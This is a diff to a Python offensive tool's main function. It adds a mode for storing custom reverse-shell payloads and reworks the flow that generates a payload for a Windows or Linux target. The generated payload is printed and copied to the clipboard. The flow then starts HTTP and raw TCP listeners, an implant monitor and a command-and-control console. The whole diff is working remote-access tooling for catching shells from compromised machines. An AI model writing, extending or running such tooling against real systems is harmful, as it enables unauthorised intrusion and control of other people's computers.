@@ -947,73 +947,96 @@ def main():
         return
 
     # ------------------
-    # Interactive fallback (original behavior)
+    # Interactive mode (mirrors CLI)
     # ------------------
 
-    # choose OS first
+    mode_choice = ask_choice("Mode (Use/Store): ", ["Use", "Store"])
+
+    if mode_choice == "Store":
+        os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
+        connection = ask_choice("Connection type (tcp/http): ", ["tcp", "http"])
+        lhost = ask_ip("Enter LHOST (IPv4): ")
+        lport = ask_port("Enter LPORT (1-65535): ")
+        name = ""
+        while not name:
+            name = input("Enter payload name: ").strip()
+            if not name:
+                print("[!] Name cannot be empty.")
+        pay_content = ""
+        while not pay_content:
+            pay_content = input("Enter payload content (use your real host:port; they will be templated): ").strip()
+            if not pay_content:
+                print("[!] Payload content cannot be empty.")
+        templated = pay_content.replace(str(lhost), "{LHOST}").replace(str(lport), "{LPORT}")
+        save_custom_payload(os_choice, name, templated, connection)
+        print(f"[+] Stored payload '{name}' for {os_choice} ({connection}).")
+        sys.exit(0)
+
+    # Use/generate and listen
     os_choice = ask_choice("Target OS (Linux/Windows): ", ["Linux", "Windows"])
+    connection = ask_choice("Connection type (tcp/http): ", ["tcp", "http"])
+    lhost = ask_ip("Enter LHOST (IPv4): ")
 
-    # get LHOST
-    lhost = ask_ip("Enter LHOST (IPv4) to bind listeners and inject into payload: ")
-
+    DEFAULT_HTTP = 2222
+    DEFAULT_TCP = 4444
     http_port = None
     tcp_port = None
-
-    if os_choice == "Windows":
-        # Ask only for HTTP port for Windows payloads; set default TCP 4444
+    if connection == "tcp":
+        # Ask TCP; default HTTP
         while True:
-            http_port = ask_port("Enter HTTP listener port (1-65535) [Linux TCP will default to 4444]: ")
-            if not can_bind(lhost, http_port):
-                print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
-                continue
-            break
-        # Assign default TCP for Linux side
-        tcp_port = 4444
-        if not can_bind(lhost, tcp_port):
-            print(f"[!] Default TCP 4444 unavailable on {lhost}.")
-            while True:
-                tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
-                if not can_bind(lhost, tcp_port):
-                    print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
-                    continue
-                break
-        else:
-            print(f"[*] Using default TCP port {tcp_port} for Linux listener.")
-    else:
-        # Ask only for TCP port for Linux payloads; set default HTTP 2222
-        while True:
-            tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535) [Windows HTTP will default to 2222]: ")
+            tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
             if not can_bind(lhost, tcp_port):
                 print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
                 continue
             break
-        # Assign default HTTP for Windows side
-        http_port = 2222
+        http_port = find_available_port(lhost, DEFAULT_HTTP) or DEFAULT_HTTP
         if not can_bind(lhost, http_port):
-            print(f"[!] Default HTTP 2222 unavailable on {lhost}.")
+            print(f"[!] Default HTTP {DEFAULT_HTTP} unavailable on {lhost}.")
             while True:
                 http_port = ask_port("Enter HTTP listener port (1-65535): ")
                 if not can_bind(lhost, http_port):
                     print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
                     continue
                 break
-        else:
-            print(f"[*] Using default HTTP port {http_port} for Windows listener.")
+    else:
+        # Ask HTTP; default TCP
+        while True:
+            http_port = ask_port("Enter HTTP listener port (1-65535): ")
+            if not can_bind(lhost, http_port):
+                print(f"[!] Cannot bind to {lhost}:{http_port}. Try a different port or ensure the host interface exists.")
+                continue
+            break
+        tcp_port = find_available_port(lhost, DEFAULT_TCP) or DEFAULT_TCP
+        if not can_bind(lhost, tcp_port):
+            print(f"[!] Default TCP {DEFAULT_TCP} unavailable on {lhost}.")
+            while True:
+                tcp_port = ask_port("Enter TCP (raw reverse shell) listener port (1-65535): ")
+                if not can_bind(lhost, tcp_port):
+                    print(f"[!] Cannot bind to {lhost}:{tcp_port}. Try a different port or ensure the host interface exists.")
+                    continue
+                break
 
-    # load payload module (linux/windows) and list keys
     module = load_payload_module(os_choice)
-    keys = list(module.payloads.keys())
-    print("\nAvailable payloads:")
+    customs = load_custom_payloads(os_choice)
+    keys = list_keys_filtered_by_connection(getattr(module, "payloads", {}), customs, connection)
+    if not keys:
+        print(f"[!] No payloads available for {os_choice} ({connection}). Add some with -m=c or 'Store' mode.")
+        sys.exit(2)
+
+    print("\nAvailable payloads (filtered):")
     for k in keys:
         print(" -", k)
 
     payload_key = ask_choice("Select payload (type exact key): ", keys)
 
-    # generate payload using the relevant port for the selected OS
-    selected_port = tcp_port if os_choice == "Linux" else http_port
-    payload_text = generate_payload_text(module, payload_key, lhost, selected_port)
+    combined = merge_builtins_and_customs(getattr(module, "payloads", {}), customs)
+    ModuleProxy = type("ModuleProxy", (), {})
+    module_proxy = ModuleProxy()
+    module_proxy.payloads = combined
 
-    # display and copy
+    selected_port = tcp_port if connection == "tcp" else http_port
+    payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)
+
     print("\n[+] Generated payload (copied to clipboard):\n")
     print(Fore.RED + payload_text + Style.RESET_ALL)
     try:
@@ -1022,21 +1045,17 @@ def main():
     except Exception as e:
         print(f"[!] Could not copy to clipboard: {e}")
 
-    # assign globals for listener
     HOST = lhost
     HTTP_PORT = http_port
     RAW_TCP_PORT = tcp_port
-    # store OS choice globally for later logic
     OS_CHOICE = os_choice
 
-    # start both listeners
     try:
         threading.Thread(target=run_http_server, daemon=True).start()
         threading.Thread(target=monitor_http_implants, daemon=True).start()
         threading.Thread(target=run_raw_tcp_server, daemon=True).start()
         time.sleep(0.5)
         print(f"\n[*] Listeners started on {HOST} (HTTP: {HTTP_PORT}, TCP: {RAW_TCP_PORT}).")
-        # Enter C2 console (blocking)
         c2_console()
     except Exception as e:
         print(f"[!] Failed to start listeners: {e}")
